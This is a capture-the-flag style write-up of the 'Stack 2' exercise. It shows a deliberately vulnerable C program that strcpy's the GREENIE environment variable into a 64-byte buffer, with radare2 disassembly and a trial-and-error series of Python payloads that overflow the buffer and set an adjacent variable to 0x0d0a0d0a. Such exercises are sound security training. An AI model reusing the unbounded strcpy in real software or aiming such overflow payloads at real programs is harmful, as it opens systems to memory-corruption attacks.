# Stack 2

## About

Stack2 looks at environment variables, and how they can be set.

``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}

```

## Solution

Like last time i open it in radare2 and `seek` to `main` and then print the dissasembly 

``` c
  0x000007d0      55             push rbp
|           0x000007d1      4889e5         mov rbp, rsp
|           0x000007d4      4883ec60       sub rsp, 0x60               ; '`'
|           0x000007d8      897dac         mov dword [rbp - local_54h], edi
|           0x000007db      488975a0       mov qword [rbp - local_60h], rsi
|           0x000007df      488d3d020100.  lea rdi, qword str.GREENIE  ; 0x8e8 ; str.GREENIE ; "GREENIE" @ 0x8e8
|           0x000007e6      e855feffff     call sym.imp.getenv        ; char *getenv(const char *name);
|           0x000007eb      488945f8       mov qword [rbp - local_8h], rax
|           0x000007ef      48837df800     cmp qword [rbp - local_8h], 0
|       ,=< 0x000007f4      7516           jne 0x80c
|       |   0x000007f6      488d35f30000.  lea rsi, qword str.please_set_the_GREENIE_environment_variable_n ; 0x8f0 ; str.please_set_the_GREENIE_environment_variable_n ; "please set the GREENIE environment variable." @ 0x8f0
|       |   0x000007fd      bf01000000     mov edi, 1
|       |   0x00000802      b800000000     mov eax, 0

..Snip..

|       `-> 0x0000080c      c745f4000000.  mov dword [rbp - local_ch], 0
|           0x00000813      488b55f8       mov rdx, qword [rbp - local_8h]
|           0x00000817      488d45b0       lea rax, qword [rbp - local_50h]
|           0x0000081b      4889d6         mov rsi, rdx
|           0x0000081e      4889c7         mov rdi, rax
|           0x00000821      e82afeffff     call sym.imp.strcpy        ; char *strcpy(char *dest, const char *src);
|           0x00000826      8b45f4         mov eax, dword [rbp - local_ch]
|           0x00000829      3d0a0d0a0d     cmp eax, 0xd0a0d0a
|       ,=< 0x0000082e      750e           jne 0x83e
|       |   0x00000830      488d3de90000.  lea rdi, qword str.you_have_correctly_modified_the_variable ; 0x920 ; str.you_have_correctly_modified_the_variable ; "you have correctly modified the variable" @ 0x920
|       |   0x00000837      e824feffff     call sym.imp.puts          ; int puts(const char *s);
|      ,==< 0x0000083c      eb16           jmp 0x854
```

looking at this, it compares the `GREENIE` enviroment value to the `eax` value of `0xd0a0d0a`

modifying the vairable like so

``` bash
[root:~]# GREENIE=$(python -c 'print "A"*76 + "\x0a\x0d\x0a\x0d"') ./2
Try again, you got 0x41414141
[root:~]# GREENIE=$(python -c 'print "A"*74 + "\x0a\x0d\x0a\x0d"') ./2
Try again, you got 0x41414141
[root:~]# GREENIE=$(python -c 'print "A"*60 + "\x0a\x0d\x0a\x0d"') ./2
Try again, you got 0x00000000
[root:~]# GREENIE=$(python -c 'print "A"*64 + "\x0a\x0d\x0a\x0d"') ./2
Try again, you got 0x00000000
[root:~]# GREENIE=$(python -c 'print "A"*70 + "\x0a\x0d\x0a\x0d"') ./2
Try again, you got 0x0d0a4141
[root:~]# GREENIE=$(python -c 'print "A"*72 + "\x0a\x0d\x0a\x0d"') ./2
Try again, you got 0x41414141
[root:~]# GREENIE=$(python -c 'print "A"*71 + "\x0a\x0d\x0a\x0d"') ./2
Try again, you got 0x0a414141
[root:~]# GREENIE=$(python -c 'print "A"*68 + "\x0a\x0d\x0a\x0d"') ./2
you have correctly modified the variable
```

got to remember to read the buffer size in the source code `68` makes sense to fill the buffer to reach the `eax` value

